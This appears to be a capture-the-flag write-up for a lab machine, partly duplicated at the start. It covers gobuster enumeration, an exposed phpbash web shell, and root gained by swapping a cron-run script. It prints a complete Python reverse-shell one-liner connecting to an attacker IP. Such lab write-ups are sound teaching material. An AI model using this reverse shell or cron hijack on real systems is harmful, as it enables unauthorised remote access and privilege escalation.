nmap scan found that there is one open port, which is the port 80


Since it was a http server, I navigated to the web page of target ip address.


I didn&rsquo;t find much interesting information on the web page, so I decided to gather more by using gobuster with the following command:
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,py,html,db,xml,sh,txt


gobuster found many interesting directories, but the directory, /dev caught my eye because it included this file phpbash.php where I could run some bash commands."

nmap scan found that there is one open port, which is the port 80</p>
<br>
<p><img src="image-1.png#center" alt="alt text">
Since it was a <strong><em>http</em></strong> server, I navigated to the web page of target ip address.</p>
<br>
<p><img src="image-2.png#center" alt="alt text">
I didn&rsquo;t find much interesting information on the web page, so I decided to gather more by using <strong><em>gobuster</em></strong> with the following command:</p>
<p><code>gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,py,html,db,xml,sh,txt</code></p>
<br>
<p><img src="image-3.png#center" alt="alt text">
<strong>gobuster</strong> found many interesting directories, but the directory, <strong><em>/dev</em></strong> caught my eye because it included this file <strong><em>phpbash.php</em></strong> where I could run some bash commands.</p>
<br>
<p><img src="image-4.png#center" alt="alt text">
obtaining the <strong><em>user flag</em></strong> wasn&rsquo;t that hard since I found the <strong><em>phpbash</em></strong>. I just had to navigate to the proper user directory.</p>
<br>
<p><img src="image-13.png#center" alt="alt text">
The problem was gaining the <strong><em>root</em></strong> user access. You guessed it. Time for <strong><em>privilege escalation</em></strong>.</p>
<br>
<p><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.51&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)'</code></p>
<p>The <strong><em>phpbash</em></strong> was very useful but it was very limited. Therefore, I decided to pop a <strong><em>reverse shell</em></strong> using the python command above.</p>
<br>
<p><img src="image-14.png#center" alt="alt text">
successfully popped the reverse shell.</p>
<br>
<p><img src="image-15.png#center" alt="alt text">
The <code>sudo -l</code> command display a list of commands you are allowed to run with <code>sudo</code>.</p>
<p><code>(scriptmanager : scriptmanager)</code> means the user can run <code>ALL</code> commands as the user, <strong><em>scriptmanager</em></strong>.</p>
<br>
<p><img src="image-16.png#center" alt="alt text">
after gaining the <code>scriptmanager</code> user shell by running <code>sudo -u scriptmanager /bin/bash</code> command, I explored the directories. I found a suspicious directory, <strong><em>/scripts</em></strong>, there were two files inside it. One is <strong>test.py</strong> and the other is <strong><em>test.txt</em></strong>. As you could see from the screenshot above, the former is owned by <strong><em>scriptmanager</em></strong> and the latter is owned by <strong><em>root</em></strong>.</p>
<p>The content of the <strong><em>test.py</em></strong> is a python program that writes into <strong><em>test.txt</em></strong> file. Also as you could see from the screenshot above, the date format of the <strong><em>test.txt</em></strong> file is a bit different from the <strong><em>test.py</em></strong> file.</p>
<br>
<p><img src="image-17.png#center" alt="alt text">
running another <code>ls -la</code> command confirmed that my suspicious was true. There exists a <strong><em>cronjob</em></strong> that is scheduled to execute the <strong><em>test.py</em></strong> file and write to the <strong><em>test.txt</em></strong> file.</p>
<p><strong><em>cronjob</em></strong> is a scheduled task in Unix-like operating systems that is executed automatically at specified intervals. It is widely used for automating repetitive tasks, such as system maintenance, backups, updates, or running scripts.</p>
<br>
<p><img src="image-31.png#center" alt="alt text">
Since I know there exists a cronjob that executes the <strong><em>test.py</em></strong> file, I can replace the file with a <strong><em>python reverse shell</em></strong> code with the same file name. The screenshot above is the code. It is the exact same code I previously had used except I changed the port to 2222 since I was already using the port 1234 to pop the original reverse shell.</p>
<br>
<p><img src="image-29.png#center" alt="alt text">
It&rsquo;s important not to forget to make the file executable.</p>
<br>
<p><img src="image-19.png#center" alt="alt text">
The command starts a simple http server in the directory where the command is executed. This means that any files in that directory will be accessible over HTTP.</p>
<br>
<p><img src="image-20.png#center" alt="alt text">
Back to the <strong>scriptmanager</strong> shell, I removed the original <strong><em>test.py</em></strong> file to replace it over with my file that contains the reverse shell code.</p>
<br>
<p><img src="image-30.png#center" alt="alt text">
Transferred the file over using the <code>wget</code> command.</p>
<br>
<p><img src="image-32.png#center" alt="alt text">
Within a minute (because the cronjob is set to run every minute), I was connected to the root shell and captured the root flag.</p>
<br>
